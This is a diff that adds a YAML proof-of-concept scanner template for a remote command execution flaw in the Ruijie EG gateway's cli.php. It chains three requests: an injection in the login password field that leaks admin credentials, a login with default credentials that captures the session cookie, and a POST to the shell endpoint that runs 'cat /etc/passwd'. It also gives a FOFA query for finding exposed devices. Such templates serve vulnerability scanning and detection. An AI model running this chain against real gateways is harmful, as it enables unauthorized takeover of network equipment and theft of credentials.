@@ -1,0 +1,36 @@
+id: poc-yaml-ruijie-eg-gateway-cli-php-rce
+info:
+  name: 锐捷 EG易网关 cli.php 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: ruijie EG易网关
+  fofa: app="Ruijie-EG易网关" && icon_hash="-692947551"
+requests:
+- method: POST
+  path: /login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&password=admin?show+webmaster+user
+  expression: status_code == 200 && contains(body,"data") && contains(headers,"user=admin")
+  output:
+  - regex_match(body,"(?P<username>[a-z0-9A-Z]{5,16})")
+  - regex_match(body,"(?P<passwd>[a-z0-9A-Z]{6,16})")
+- method: POST
+  path: /login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&password=ruijie
+  expression: status_code == 200 && contains(body,"{\"data\":\"0\",\"status\":1}")
+  output:
+  - regex_match(headers,"RUIJIEID=(?P<cookie>[0-9a-zA-Z]+)")
+- method: POST
+  path: /cli.php?a=shell
+  headers:
+    Cookie: RUIJIEID={{.cookie}}; user=admin
+    Content-Type: application/x-www-form-urlencoded
+  data: notdelay=true&command=cat+/etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
